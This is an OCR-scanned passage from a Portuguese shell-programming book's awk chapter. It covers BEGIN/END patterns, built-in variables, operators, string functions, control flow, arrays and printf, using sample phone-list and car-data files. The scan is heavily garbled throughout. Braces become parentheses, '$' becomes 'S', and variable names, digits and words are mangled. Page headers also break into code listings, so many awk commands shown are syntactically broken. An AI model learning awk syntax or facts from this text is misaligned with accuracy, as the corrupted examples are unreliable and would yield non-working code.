S awk ' $1 ~ / E/ ,/N/ { pr int ) ' tele fone• 
Enio Cardoso 
(023)232 -3423 
J uliana Duarte 
(024) 622- 2876 
Luiz c ,u ! os 
(021 ) 767-212 4 
Ney Garraf as 
(0Z l )9SS-339S 
Observe que o registro referente ao Ney Gerha ~ctt não foi listado. A pes-
quisa termina assim que o segundo padrão de comparação é atingido. 
Mate 
com d re l s 
1 • s 
awk: Comando ou Linguagem> 
351 
Para usarmos o que foi exposto, o arquivo deve estar clas-
sificado pelo campo que estamos pesquisando. Como exer-
cício, experimente pesquisar no segundo campo os nomes 
que comecem desde a letra C até a letra D. Viu só que resul-
tado confuso? 
Além de tudo que foi falado sobre metacaracteres, o awk ainda reconhe-
ce as seguintes sequências típicas da linguagem C: 
f 
Sequência 
Significado 
\n 
Newline 
\r 
Carriage Retum 
!• 
\b 
Backspace 
\f 
formfeed 
f-
\t 
<TAB> 
\ddd 
valor octal ddd 
Padrões BEGIN e END 
Quando desejamos fazer algum processamento anterior à entrada do pri-
meiro registro, usamos o padrão BEGIN -
para fazer um cabeçalho, por 
exemplo - e quando a necessidade é de que o processamento seja feito 
após a leitura do último registro, deve ser usado o padrão END - para gerar 
totais e médias dos registros processados, por exemplo. 
Exemplo: Para mostrar o uso dos padrões BEGIN- END, vamos listar o 
telefones, colocando um cabeçalho: 
$ awk 'BEGIN ( print "Nome 
Nome 
Telefone 
Ci.to Grippi 
Cl audi a Marcia 
Enio Cardoso 
Juliana Oua.rte 
Luü Carlos 
Ney Garrafas 
Ney Gerhardt 
Paula Dua.r:t.e 
(021)555-1234 
(021) 555-2112 
(023) 232-3423 
(024) 622-2876 
(021)767- 2124 
(021) 988-3398 
(024) 543- 4321 
(011) 449-0219 
Telefone" ) { pri nt } ' telefones 
352 Programação Shell Linux 
A primeira coisa que o awl: fez foi executar o(s) comando(s) do padrão 
BEGIN, em seguida, executou o núcleo do programa listando os registros 
do arquivo e, ao encontrar o eor (End O f Eile -fim do arquivo), caso hou-
vesse um padrão END - para listar o total de registros, por exemplo - seu( s) 
comando(s} seria(m) então executado(s}. 
O uso de variáveis 
Além do sn, onde n é o número sequencial do campo, que já vimos, o awk 
trabalha ainda com outros dois tipos de variáveis: 
Variáveis definidas pelo programador - Como o nome diz, são variá-
veis de trabalho que serão controladas pelo programa. 
Variáveis Internas- São variáveis predefinidas largamente utilizadas 
pelo a1·Jk e por ele mantidas. Devem sempre ser usadas em letras 
maiúsculas, sem o cifrão (Sl precedendo-as, e cada uma atende a 
uma determinada função. 
Variável 
Significado 
ARCC 
Número de argumentos (parâmetros) recebidos pelo pro· 
grama 
ARCV 
Vetor contendo os parâmetros passados para o programa 
FILENA.'IE 
Nome do arquivo de entrada corrente 
FMR 
Número do registro no arquivo corrente 
FS 
Separador de campos. Seu default é branco e <TAB> 
NF 
Quantidade de campos do registro atual 
NR 
Quantidade de registros do arquivo em processamento 
OFM'r 
Formato de saída para números. Seu default é %.6g 
OFS 
Separador de campos na saída. Seu default é branco 
ORS 
Separador dos registros de salda. Seu defaull é newline 
RS 
Separador de registros de entrada Seu default é newtlne 
Exemplo: 
Vamos fazer o proposto no item anterior, isto é, vamos usar o padrão END 
para totalizar os registros processados: 
$ awk 'BEGIN { print "Nome 
> ( print ) 
Telefone" ) 
~la:cnu 
mJo 
awk: Comando ou Unguagem? 
353 
> END { print "Quantidade de Telefones =",NR} ' telefones 
Nome 
Telefone 
Ciro Grippi 
(021) 555-1234 
Claudia Harcia 
(021} 555-2112 
Enio Cardoso 
(023)232-3423 
Juliana Duarte 
(024)622- 2876 
Luiz 
Carlos 
(021) 767- 2124 
Ney Garrafas 
(021)988- 3398 
Ney Gerhardt 
(024)543-4321 
Paula Duarte 
(011) 449-0219 
Quantidade de Telefones = 8 
A variável NR continha o tola/ de registros processados. 
Vejamos como contar os campos que aparecem em duplicidade: 
s awk ' $1 - /Ney/ 1 print; Sana=Sana+l 1 A variável Soma não foiinicíalizada com zero. 
> END { print "Encontrei" , Soma , "Registros" } ' telefones 
Ney Garrafas 
Ney Gerhardt 
(021) 988-3398 
(024) 543-4321 
Encontrei 2 Registros 
Note que, no exemplo anterior, não foi necessário definir a variável 
Soma nem sequer inicializá-la com valor zero. No ambiente do awk, na 
primeira menção que se faz a uma variável, ela automaticamente é criada 
e inicializada. Caso o valor associado a essa variável seja numérico, será 
inicializada com zero, caso contrário com "" (cadeia vazia). Assim, quando 
fizemos soma=Soma+l, a variável soma, por estar atuando em um contexto 
numérico, foi criada com o valor zero e posteriormente foi incrementada de 
1. Já no COmandO print "Encontrei", Soma, "Registros", para que haja 
a concatenação, soma está sendo forçada a atuar como alfanumérica. 
Em um contexto ambíguo como: 
Sl •• $2 
o tipo de comparação que será feito depende se os campos são numéricos 
ou não, o que somente será determinado quando o programa estiver em 
execução, quando então poderá ser diferente a cada registro. 
Em comparações, quando ambos os operandos são numéricos, a com-
paração é feita numericamente; caso contrário os operandos serão trata-
dos como cadeias de caracteres. Assim, a comparação será bem sucedida 
para qualquer par dentre os operadores: 
5 
O. Se+l 
os 
+5 
5 . 00 
354 Programação Shell Linux 
mas falhará, caso as comparações sejam feitas como cadeia de caracte-
res, nos seguintes casos: 
operl 
NULL 
Og 
Se! 
oper2 
o 
o 
S .Oo1 
Para forçar um número a se comportar como cadeia de caracteres, você 
deve concatenar ao número uma cadeia vazia. Assim: 
Cadeia = Numero 
M n 
E pode fazer o oposto adicionando zero ao valor da variável. Veja o 
exemplo abaixo: 
$ awk 'BEGIN (Cadeia=" l OOabc"; Num=Cadeia+O; print Num, 
100 -
l OOabc 
._ 
.. 
Cadeia)' 
Como vimos, a variável cadeia permaneceu com o seu valor originalmen-
te atribuído, porém, ao criarmos Numero somando o à cadeia, esta variável 
recebeu somente a parte numérica do início de cadei a. Se o valor de cadei a 
fosse abeto o e não t ooacb. ao executar Num=cadeia+o, em Num resultaria o 
valor o porque não existia nenhum algarismo no início de cadeia. 
Exemplo: Para que o nosso velho telefone possa dar uma descansada, 
afinal ele não é de ferro, vamos mostrar um novo arquivo, cujo nome é 
carr os composto do modelo, da velocidade máxima, do tempo mínimo 
para alcançar 100 km/h, partindo do repouso, do consumo mínimo e do 
preço médio, de alguns carros nacionais 1.6 I. Todos esses campos sepa-
rados por um espaço em branco. Vejamos então este arquivo: 
$ cat carros 
corsa- 3poreas 150 15 . 20 12 . 20 16068 . 00 
Corsa-4por tas 182 11.10 10 . 00 16928 . 44 
corsa- sedan 182 11 . 10 10 .00 17376 . 49 
Cor•a -~lagon 18312 .20 12 . 71 20253 . 45 
Palio 188 9.50 10 . 90 19974 . 15 
Pa1io-Weekend 185 11 . 92 10 . 65 21200 . 44 
Ti po 176 1 1. 70 1 1. 00 183 10 . 70 
Gol 175 12 . 40 11. 60 16960 . 50 
Parati 173 12 . 20 11. 31 18809 . 22 
~1atcria com d r bs auto a.~s 
awl<: Comando ou Unguagem? 
355 
Nossa! Que balbúrdia! Para fazer-lhe uma "maquilagem", a fim de exibi-
lo de forma mais legível e calcular velocidade e preços médios, foi feito um 
programa. Vamos listá-lo: 
$ cat listcar.awk 
awk ' 
BEGIN 
{ printf "%15s %lOs %9s \7s %10s\n", 
"Modelo", 
11Vel .Max . ", "O a 100n, "Cons .", "Preco"
) 
{ printf ''%15s %7s \11s \Ss %11s\n", 
$1 , $2, S3, $4 , $5 
VelM = VelM t $2 ; Pr = Pr + $5 ) 
END ( printf "\n%7s\n%8s %7s\n%5s l lOs\n", 
"MEDIAS:", "Velocidade", VelM I NR, "Prece" , ?r I NR ) ' carros 
Observe que foi usado o padrão BEGIN para criar o cabeçalho, em se-
guida foi feita a formatação dos dados. Os valores das velocidades e dos 
preços foram acumulados, e, finalmente, usamos o padrão END para listar 
as médias, que foram calculadas, dividindo-se os totais pela quantidade de 
registros (NR) . 
Vamos então executá-lo: 
$ listcar . awk 
Modelo 
Corsa-3portas 
Corsa- 4porcas 
Corsa·Sedan 
Corsa-Wagon 
Palio 
Palio-Weekend 
Tipo 
Gol 
Parati 
MEDIAS : 
Velocidade 177 . 11 
Preco 
18431.30 
Faz de conta 
Vel.Max . 
150 
182 
182 
183 
188 
185 
176 
175 
173 
O a 100 
15 . 20 
11.10 
11 .10 
12 . 20 
9.50 
11 . 92 
11 .70 
12 . 40 
12 . 20 
Cons . 
12. 20 
10 . 00 
10. 00 
12. 71 
10 . 91) 
10. 65 
11.01) 
11 . 60 
11 .31 
Preco 
16068 .00 
16928 . 44 
17376. 49 
20253 . 45 
19974 . 15 
21200 . 44 
18310 . 70 
16960 . 50 
18809 . 22 
Conforme já foi citado, fazer contas ou usar aritmética em awl< é muito si-
milar ao processo de fazê-lo na linguagem C, ou seja, a aritmética do awk 
também é feita internamente em ponto flutuante, a notação científica (expo-
nencial) também é reconhecida e produzida, e os operadores, bem como a 
forma de usá-los, são idênticos aos da linguagem C. 
356 Programação Shell Linux 
Operadores 
Vejamos então os operadores do awk e como usá-los. 
fl 
Operadores 
Significado 
+ 
Soma 
I' 
Diferença 
I· 
• 
Multiplicação 
I' 
I 
Divisão 
1-
t 
Resto da Divisão 
I= 
~ ou •• 
Exponenciação 
~ 
= 
Igualdade 
Em um exemplo que vimos anteriormente, para totalizar a quantidade de 
registros contendo a cadeia Ney em telefones : 
$ awk ' $1 ~ /Ney/ { p rint; Soma•Soma+1 I 
END { print "Encontrei ••, s oma, "Rogistros" } ' telefones 
Como o awk tomou emprestados os operadores aritméticos da linguagem 
C, a primeira linha do programa anterior poderia ser escrita de forma mais 
sucinta: 
$ awk ' $1 ~ /Ney/ { p rint; Soma++ I 
ou ainda: 
S awk ' $1 
~ / Ney/ { print; soma+=1 ) 
tanto o operador += quanto o ++ são mais enxutos e executam mais ra-
pidamente. 
Generalizando, podemos dizer que uma operação com o formato: 
va.riavel = variavel <operador> expressao 
teria o mesmo efeito, se fosse escrita de forma abreviada como a seguir: 
variavel <operador> • expressao 
Portanto, são válidos os seguintes operadores abreviados: 
/=, •=, '=, e seus usos devem ser encorajados. 
+= , 
~= , 
awk: Comando ou linguagem> 
357 
Os operadores incrementais são ++ e --. Como em C, podem ser 
usados prefixando (++variavel) ou posfixando (variavel++) da seguinte 
forma: suponha que varl = 5 . Se fizermos var2 = ++varL então varl 
será incrementado de 1 e será colocado 6 em var2 , ao passo que var2 = 
varl++ faz var2 igual a 5 e após varl será incrementado de 1. Uma inter-
pretação análoga deve ser dada para prefixar ou posfixar com 
Funções matemáticas 
O a>lk possui diversas funções internas para manipulação de dados numé-
ricos. As mais usadas são: 
Ll 
Fun~o 
Valor Retornado 
sqrt (x) 
Raiz quadrada de x 
sin (x) 
Seno de x 
cos (x) 
Cosseno de x 
log (x) 
Logaritmo natural de x 
int (x) 
Parte inteira de x 
exp (x) 
Função exponencial de x 
rand (x) 
Gera um número randômico entre O e 1 
Prá cadeia ... 
No ambiente do awk, cadeias de caracteres são sempre tratadas entre 
aspas (" " l . 
As cadeias de caracteres são criadas concatenando constantes, variá-
veis, campos, elementos de vetores (atrays), funções e outros programas. 
Veja a execução do comando a seguir: 
$ awk '{pri nt NR ":" $0} ' carro$ 
l :Corsa- 3portas 150 15 .20 12 .20 16068 . 00 
2:Corsa-4portas 182 11 . 10 10 . 00 16928 . 44 
3:Corsa-Sedan 182 11 .10 10 . 00 17376. 49 
4:Corsa-Wagon 183 12 . 20 12 .71 20253 . 45 
S: Palio 188 9. 50 10 . 90 19974 . 15 
6: Palio-Weekend 185 11 .92 !0 . 65 21200 . 44 
7 :Tipo 176 11 . 70 11 . 00 18310 . 70 
8 :Gol 175 12 . 40 11 . 60 16960 . 50 
9 : Parati 173 12 . 20 11 . 31 18809 . 22 
358 Programação Shell Linux 
Como você viu, cada registro de ca rros foi precedido por seu sequen-
cial no arquivo, seguido por um dois pontos ( : > , sem espaços em branco. 
Dessa forma as três cadeias foram concatenadas e a cadeia resultante 
foi impressa. Então. o operador de concatenação não tem representação. 
basta justapor as cadeias. 
O ""1k possui diversas funções internas, predefinidas, para tratamento 
de cadeias de caracteres. Vamos conhecê-las, antes de mais nada, para 
podermos aplicá-las enquanto adquirimos conhecimento sobre o tema. 
Na tabela a seguir, cl e c2 são cadeias de caracteres, exp é uma expres-
são regular (pode ser uma cadeia ou algo como /exp/) e p, n são inteiros . 
.:::::1 
Função 
Descrição 
index (cl ,c2) 
Retoma a posição da cadela cl 
na cadeia c2 
length (cl) 
Retoma o tamanho da cadeia cl 
match (cl. exp) 
Retoma a posição em cl onde 
ocorre 
split(cl,v [.c2]) Divide cl para o vetorl2 v em 
cada c2 encontrado 
. 
f("'""' 1• 
) Retoma lista formatada de 
spnnt "'"• lSta acordo com fmt 
b( 
1 [ 
21) A primeira exp encontrada na 
su 
exp • c 
• c 
cadeia c2 é substituída por cl 
gsub(exp. cl [. , 2 B T od~ exp ~n~(Jntrada na cadeia 
c2 e substiturda por cl 
substr(cl,p.n) 
...._ __ _ 
Exemplo: gsub 
Retoma a subcadeia que começa 
na posição p de c1 com n caracteres 
-
--
--- -----
Retorno 
Zero se não 
presente 
Zero se não 
presente 
Número de 
campos 
Número de 
substituições 
Número de 
substituições 
No próximo exemplo o i ndex devolverá somente a posição da primeira 
ocorrência de x 
$ awk 'BEGIN (print index(,.LlNUX•UtUX .. , "X")} ' 
5 
Usando BEGIN nlio especilica nome do arq 
32 O uso de vetores ou arrays será mais aprofundado na seção Valores de Vetores 
~la:CIIu 
mJo 
awk: Comando ou linguagem? 
359 
Observe agora os dois exemplos a seguir sobre o uso da função 
length : 
$ a wk ' BEGIN 
print length ( " LINUX- UNIX" ) } ' 
10 
$ a wk 'BEGIN 
print length (22 * 5) } ' 
3 
No primeiro caso, tudo bem, 10 é realmente o tamanho da cadeia. Mas, 
no segundo exemplo, o tamanho da cadeia <22 * 51 é 6, porém 22 multi-
plicado <*> por 5 é igual a 110, cujo tamanho é 3. 
Veja agora esta série de exemplos utilizando a função match e aprovei-
tando para travar maior contato com as expressões regulares do awk : 
$ a wk ' BEGIN {print match ( "veem, vem" .fve+m/) ) • 
1 
Nesse caso, pesquisei em qualquer local da cadeia a ocorrência da ex-
pressão regular, que significa: ve seguido de repetições do último e, acei-
tando inclusive nenhuma repetição <+> seguido de um m. Dessa forma, o 
awk devolveu a posição do veem (1) . 
$ a wk ' BEGIN {print match( "veem,vem" , "ve+m$ " )1 ' 
Comonosedenogrepo$=fim 
6 
Idêntica à anterior, exceto que a pesquisa foi feita no final da cadeia, de-
volvendo, portanto, a posição do vem (6) . Pelos dois casos anteriores po-
demos inferir que a expressão regular tanto pode estar entre barras <1 /l , 
como entre aspas <"" 1 . 
Para finalizar essa série, veja só a diferença entre estes dois casos: 
$ awk ' BEGIN { print match ( "Jul io J uliana", / l i+a/) 
) ' 
9 
$ a wk ' BEGIN { print match ( "Julio Juli ana", / li .+a/1 ) . 
3 
No primeiro, o awk devolveu a posição de li em Juliana, no segundo, 
a posição de li em Julio . Isso aconteceu porque neste último eu pesqui-
sei li. seguido por qualquer caractere <. 1 com repetição <+ 1, e depois, 
em qualquer lugar da cadeia portanto, o caractere a . 
360 Programação Shell Linux 
A função match atualiza uma variável interna chamada RSTART com a posi-
ção encontrada. Atualiza também a variável interna RLENGTH com a quantida-
de de caracteres da subcadeia encontrada. Se nada foi encontrado, RSTJI.RT 
é atualizada com O e RLENGTH com -1. Vamos incrementar o último exemplo: 
$ awk: 'BEGIN { pri nt match ("Julio Juliana", 
11li.+a"), RSTA.RT, RLENGTH)' 
3 3 11 
Na função split , caso o terceiro argumento, que é o separador por 
onde será dividida a cadeia em vetores, não seja explicitado, será tomado 
como separador a variável interna r s . Vejamos: 
$ awk 'BEGIN { print spl it ("ponto .. e-virgul a "" v, "-") } ' 
3 
O retorno da função indica que a cadeia foi dividida em três partes para 
o vetor v. Caso listássemos v , teríamos: 
v[l } • "ponto" 
v ( 2l -= ''e" 
v ( 3) • 
" vi~gula " 
Vejamos um exemplo sem o terceiro argumento: 
$ awk 'BEGIN { p rint split ( 6 Juliana Duarte 11 , v) } • 
2 
v agora teria: 
v [l) • "Juli an&'' 
v[2) = "Duarte '' 
porque o rs default é branco ou <TAB> . 
Vamos ver dois exemplos sobre a função sub, de forma a introduzir um 
novo operador, o de concatenação: 
$ awk 'BEGIN { 
> 
> 
> 
Nomo=" Julio'' 
sub (/o/ , 
11 ana" , Nome) 
print Nome 
> ) ' 
Juliana 
$ awk 'BEGIN 
> 
Nome•"Juli ana" 
Trocar o 1• •o• encontrado por ana 
~1atcria com d r bs auto a.~s 
awk: Comando ou Unguagem? 
361 
> 
sub (/ana/ , " & Duarte", Nome) 
Concatenar ao 1P •ana• encontrado a cadeia • Duarte• 
> 
print Nome 
> I ' 
Juliana Duart.e 
No primeiro caso, trocamos a ocorrência do primeiro "o " por "ana" , no 
segundo, o & serve para concatenar à primeira ocorrência da cadeia "a na " 
a cadeia "Duarte" . Mais um exemplo sobre concatenação para ver como 
isto funciona: 
$ awk 'BEGIN { 
> 
Maqica="cad" 
> 
sub (/cad/ , "Abra&abra" , Hagica) 
> 
print Hagica 
> I , 
Abracadabra 
Como você viu, o & substitui a cadeia que está sendo pesquisada (no 
caso cact) e concatena outras cadeias àquela. 
Você se lembra do arquivo confusao? Só para refrescar a memória: 
$ cat confusao 
cd $ROME; pwd; date; ls -la; echo SLOGNAME xS{SHELL)x 
Vamos colocá-lo de forma mais legível, trocando todo ponto e vírgula <: > 
por newline (012 em octal): 
$ awk 'gsub {";", "\012") ' confusao 
cd $HmlE 
pwd 
date 
ls -la 
echo SLOGNAME xS{SHELL)x 
Instruções de controle de fluxo 
É muito ruim a pessoa ser repetitiva! Mas, por mais que eu tente, às vezes 
é muito difícil evitar. Vamos ver: o awk provê instruções condicionais if -
else e instruções de loop (ou laço como preferem alguns puristas) como 
while, do -
whi le e f o r , com seus comandos entre chaves ( { l > , exa-
tamente como se faz na linguagem C (tentei evitar mas não consegui). 
362 Programação Shell Linux 
O comando if 
A esta altura do campeonato, não cabe mais explicar para que serve o co-
mando if. Vamos portanto direto ao assunto. Veja a sua sintaxe: 
if (expressao) 
else 
I 
comando1 
comando, 
comandon 
} 
comando, 
comando1 
comando" 
Nesse contexto, expressao atuando como a condição, não tem restri-
ções; pode incluir operadores relacionais (<, <=, >, >=, == e !=), os 
operadores de pesquisa em expressões regulares 1 ~ , ! ~ > e os operadores 
lógicos 1 1 1 , & & , 
! l . 
Se o escopo do if ou do else for somente um comando, ele não neces-
sitará estar entre chaves 1 1 1 l . 
Exemplo: Vamos ilustrar o uso do comando if com um programa que pes-
quisará o arquivo carros e ao seu final listará o carro mais veloz e o mais 
econômico. 
$ cat VelEcon.awk 
awk ' BEGIN ( MinCons=99999 
I 
if 
( $2 > MaxVel 
{ 
CarVel=Sl 
MaxVel=$2 
} 
if 
( $4 < MinCons 
I 
CarEcon=$1 
NinCons=$4 
) 
Verdadeiro no 1Q registro pois MaxVel é criada com O 
No 1• registro será verdadeira porque MinCons=99999 
awk: Comando ou linguagem> 
363 
ENO l 
print "'0 "1 CarVel, "desenvol ve .. ,\ 
Aliftima\ foiplpassarplaolrtra/inha 
MAXV~l. "km a\no ••, Cé r eco ~!, "faz", NinCohs., "km/1 \n't 
J ' carros 
Esse programa quando executado produz: 
$ VelEcon. a.· .. •k 
O Palio desenvolve 188 km e 
o Corsa - 4po r~as faz 10 .00 km/1 
O comando while 
Vamos ver a sintaxe do comando while: 
~..rhile (e-xpressao) 
comando 
comando _ 
coma.ndo" 
Onde expressão é avaliada; e se seu resultado for diferente de o (zero) 
e de NULL (00 em ASCII), os comandos compreendidos entre o par de cha-
ves t 1 l > são executados. E, como em todo Ylhile que se preza, esse ciclo 
é executado diversas vezes, até que eY.pressao retorne falso (o - zero). 
Exemplos: 
No exemplo a seguir, está listado um fragmento de código a 1•k para listar 
cada campo de um registro em uma linha: 
l 
; 
1 
•..thile-
(i < ... Nln 
print $ i 
i ++ 
Até que i seja maior que o mímero de campos ... 
Mate 
com d re l s 
1 • s 
364 Programação Shell Unux 
for midável... 
O comando for do awk tem duas formas de aplicação distintas. Inicial-
mente vamos analisá-lo na sua sintaxe primordial, e quando falarmos de 
vetores (logo ali na frente), vamos ver uma forma bastante peculiar. 
Na sua forma mais óbvia de uso, o seu contexto é muito semelhante ao 
do comando while e, como não podia deixar de ser (ou seria "deixar de 
C"?), sua sintaxe é igual à do seu congênere na linguagem C, que é assim: 
for (expressao ; expressao,; expressao ) 
comar.do. 
comar.do 
coma r: de 
onde expressao serve, normalmente, para atribuir valor inicial a uma va-
riável, que será incrementada pelo valor de expressao, e as instruções 
compreendidas entre o par de chaves ( 1 1) são executadas enquanto 
expressao,. for verdadeira. 
Se fizéssemos: 
for (i = 1; 1 <= NF; i+T) print Si ) 
estaríamos mandando inicializar uma variável i com o valor 1, que será 
incrementado de 1 em 1 e enquanto i for menor que o número de campos 
do registro (NF), estaremos listando um campo por linha. Ou seja, esse pe-
daço de código produziu o mesmo efeito que o comando while no trecho 
de programa no exemplo anterior. 
Ora, mas eu aleguei que o conjunto de comandos que seriam executa-
dos pelo for deveriam estar entre chaves < t l) , e não fiz isso com o print 
no exemplo anterior! Por quê? A resposta está embutida na própria pergun-
ta! Não usei as chaves porque o escopo do tor era um único comando (o 
print) e nesse caso não é necessário o seu emprego. Isso significa que, 
caso você esqueça de colocar chaves quando necessário, você não rece-
berá erro de sintaxe, mas sim de lógica, já que o for executará somente a 
primeira instrução como seu argumento. 
awk: Comando ou Linguagem? 
365 
break e outros bric-a-bracs 
Como você pôde notar, os laços (loops) executados pelos comandos anterio-
res são sempre na horizontal, em relação aos campos, quero dizer, levando-se 
em consideração que os registros são as linhas dos arquivos, trabalhar com 
seus campos significa trabalhar horizontalmente. Por isso, o awk possui outros 
tratamentos de loop além do break e do continue (que atuam exatamente 
igual aos seus homônimos do Shel~. Vamos vê-los de fonna resumida: 
-
break -
Assim que este comando é encontrado, a execução do pro-
grama desvia para a primeira instrução após o loop; 
-
continue - Quando encontrado o fluxo do programa é desviado para 
a primeira instrução do loop; 
-
next -
Causa o desvio do fluxo de comandos já que o awk irá saltar 
imediatamente para o próximo registro (deste modo no sentido ver-
tical) e voltará a pesquisar padrões a partir do comando da primeira 
dupla "padrão-ação"; 
-
exit -
O comando exit força o programa a se comportar como se 
a leitura do arquivo tivesse acabado; nada mais é lido da entrada, e 
a ação END, se existir, será executada. Neste comando, você poderá 
passar um código de retorno para o She/1 fazendo: 
exit. retorno 
Valores de vetores 
Nesta seção, trataremos o uso de vetores ou arrays, já que o awk os pro-
vê da utilização de vetores unidimensionais. Os vetores e seus elemen-
tos têm o mesmo tratamento de variáveis, não necessitando portanto 
serem declarados, pois passarão a existir assim que lhes for atribuído 
um valor. 
Exemplo: Se fizermos 
$ awk '(Registro [NR)= $0 )' carros 
NR= Variável que contém número do registro 
teremos em memória, dentro do vetor Registro, o conteúdo do arquivo 
carros , indexado pelo sequencial do registro. 
366 Programação Shell Linux 
Vamos aproveitar o exemplo anterior e fazer um programa para listar 
tele fones de trás para a frente: 
$ cat tac.awkH 
mvk • { 
END 
Regi stro (NR) 
~ SO 
) 
for ( i :::NR; i >l; 1.--
) 
p.d .m:. Re9istt:o ( i ) 
) ' te l e fones 
Ao final da carga do vetor Regist ro, o programa faz um loop para listar 
cada linha do vetor, a partir da última (IIRI até a primeira. Vamos executá-lo: 
$ tac . a;.,•k 
Paula Dua~te 
(0 11)449-0219 
Ney Gerhardt 
(02 ~ )543- 4 32 1 
Ney Garrafas 
(021) 988-3398 
Luiz Carl os 
(021)76?-2 121 
Juliana Duarte 
(024)622- 2876 
Enio C,u doso 
(023) 232-3423 
Cl audia 11a.rci a 
(021 1 555-2112 
Cira 
Grippi 
(021)555 - 1234 
Felizmente, o tratamento de vetores feito pelo awk nos permite indexá-los 
com valores não numéricos. Isso pode nos ser útil, quando necessitamos 
de muito acesso randômico em um arquivo não muito grande (que possa 
residir com folga na memória). Repare, no exemplo a seguir, que dois veto-
res foram criados: um com todo o registro e outro com as velocidades. Em 
ambos, o campo usado como subscrito foi o modelo. 
S cat indexauto.awk 
awk '{ 
ENO 
Regis tros ($1) ; $0 
Velocidades ( $1 ) ; 
$2 
for (Hodelo 1n Velocidades) 
Print Hodelo, .. \t "1 velocidades (Model o} 
) ' carros 
SI = modelo e $2 a ve/. m~~. 
U representa um < TAB> 
33. Eu chamei este programa de ta c . aw~ porque em Unux existe um comando tac (repare que 
t a c é cat ao contráuo) que faz exatamente a mesma coisa. Isto é, lista o arqutvo da últirna para a 
primeira linha. 
Mate 
com d re l s 
l • s 
awk: Comando ou Linguagem? 
367 
Se fosse o caso, esse programa teria no vetor Registros todos os dados 
do arquivo carros, disponibilizando-os para eventuais consultas randômi-
cas. Mas, aproveitamos o embalo e listamos os modelos e suas velocida-
des, já que também havíamos criado velocidades. Veja só: 
$ indexa\lto .awk: 
Paz:ati 
173 
Pal io 
1 66 
Corsa-Wllqon 
183 
Corsa-4portas 
162 
corsa- sedan 
182 
Gol 
175 
Tipo 
176 
Corsa-lpo.rtas 
150 
Pal io-ÇtJeekend 
185 
Esta é a forma de usar o to r que eu havia dito que explicaria mais tarde. 
Ele interage com todos os elementos de um vetor. Sua forma é: 
For (indice in vetor) comando 
E executa comando com a variável índice assumindo todos os valores 
dos subscritos definidos para vetor. 
Como você não conhece os moderes contidos em carros, caso quises-
se saber dados sobre o Clio, antes teria que perguntar sobre a sua existên-
cia no vetor Registros, fazendo: 
if (Registros (''Clio") ! = ''fl) 
. . . 
Ora, essa forma está correta, porém, como o Clio não está cadastrado, 
teríamos como efeito colateral do i f a criação de um elemento vazio no 
vetor Regist ros, indexado de Clio. Esta mesma pergunta poderia ser feita, 
sem subprodutos indesejáveis, da seguinte forma: 
i f ("Clio" i n Regis t ros) ... 
Essa é a forma que eu prefiro. 
Uma outra forma muito eficiente de trabalhar com vetores é usando a 
função interna splil: . 
~1atcria com d r bs auto a.~s 
368 Programação Shell Linux 
Para matar um elemento de um vetor, basta simplesmente fazermos: 
delete vetor ( indice ) 
Dessa forma, o elemento i ndice de vetor seria apagado. 
print e printf parece mas não é ... 
Os comandos print e print.r:, como já foi visto anteriormente, são as prin-
cipais instruções usadas para saída de dados em ambiente awk. O print 
é usado para gerar saídas de dados simples, sem muitos rebuscados; já 
o p rintf se encarrega de fazer saídas com formatações mais complexas, 
caprichando mais na aparência. Como em scripts Shefl, o awk deixa redire-
cionar a saída, portanto o print e o pnntf podem ter suas saídas redire-
cionadas para arquivos e pipes . 
Para melhor esclarecer esses comandos, devemo-nos lembrar que na 
seção A1 .3, vimos que tanto o Separador de Campos de Saída (Output 
Eield Separator) quanto o Separador de Registros de Saída (Output Re-
cord Separator) estão definidos, respectivamente, nas variáveis internas 
ors e ORS. Inicialmente, o ors contém um espaço em branco e o oRs 
um newline, mas esses valores podem ser mudados a qualquer momento, 
para facilitar a edição de relatórios. Vejamos mais amiúde como funcionam 
os dois comandos. 
A saída com print 
O comando 
pcint e;~;pressao l , expressao1, 
. .. 1 expressao, 
Imprime o valor de cada e xpressa o separado pelo ors colocando um 
oRs ao seu final. O comando: 
print. 
É uma abreviatura de: 
print $0 
~1atcria com d r bs auto a.~s 
awk: Comando ou linguagem> 
369 
Para imprimir uma linha em branco faça: 
print ••" 
Formatando a saída com printf 
Basicamente, o printf em ambiente awk comporta-se identicamente ao 
do C, isto é, ambos têm a mesma morfologia, a mesma sintaxe e produ-
zem os mesmos resultados. Julgo conveniente, sempre que ocorre, real-
çar esta semelhança, uma vez que os iniciados na linguagem C já podem 
sair por aí usando o printf do a"'k sem perder seus preciosos minutos 
lendo esta seção. 
O comando tem a seguinte sintaxe: 
printf formato, expressao,, 
expressao~ , . . . , expressao., 
onde formato é uma cadeia que contém tanto as informações a serem 
impressas quanto as definições dos formatos das cadeias resultantes de 
expressao,, expressao,, ... , expressao •. As citadas definições dos for-
matos sempre começam por um % e terminam por uma letra, de acordo 
com a seguinte tabela: 
~ 
Letra 
A expressão será impressa como: 
c 
Simples caractere 
d 
Número no sistema decimal 
e 
Notação científica exponencial 
f 
Número com ponto decimal 
g 
O menor entre os formatos %E e %f com supressão dos zeros 
não significativos 
o 
Número no sistema octal 
s 
Cadeia de caracteres 
x 
Número no sistema hexadecimal 
% 
Imprime um %. Não existe nenhuma conversão 
370 Programação Shell Linux 
Exemplo: 
Nos exemplos a seguir estão sendo mostradas sequências de saídas 
do print f tabeladas. Em alguns dos casos (os finais), usei a barra vertical 
< 1 1 para enfatizar que, além de formatar, o comando também permite que 
se programe o alinhamento dos campos. Observe a tabela apresentada a 
seguir. 
O formato default de saída numérica é %.6g; que pode ser alterado, mudan-
do-se o valor de oFMT, que, além disso, também controla a conversão de valo-
res numéricos para cadeias de caracteres para concatenação, por exemplo. 
Como redirecionar a saída com printf? 
Como já havia adiantado, o awk permite o redirecionamento de suas saídas 
para arquivos e para comandos She/1. Fazer isso é quase óbvio, mas, note, 
eu disse quase. Há alguns poucos macetes, que ao longo desta seção 
passarei a explicar. 
L] 
Entrada 
Saída 
print.f •%d•. 99/ 2 
~g 
pt'int.f •%e• , 9912 
4 . 95G000e+Ol 
Noceça<> clentlflca 
princ.f "\f", 99/ 2 
49 . SOGOOO 
printf '%6 . 2f• . 99/2 
49. 50 
6 inteS-os e 2 decimais sem zero à esquema 
print.f •\g" ,99/2 
49.50 
O lo<malo %1 ficaria mGOO" 
printf •to". 9 
11 
9 conVll11ido para octal é iguala 11 
printf ·~04o " , 9 
0011 
9 em octal. 4 algarismos e O â esquerda 
prinef ·tx". 20 
14 
20 oonve<tldo para hexadeclmal dã 14 
printf • f\s I " , ' f'lam.try" 
IFlamaryl 
Foonato de edição de cadeias 
print.f 'l%l~si",'Flamary • 
-- ---
I 
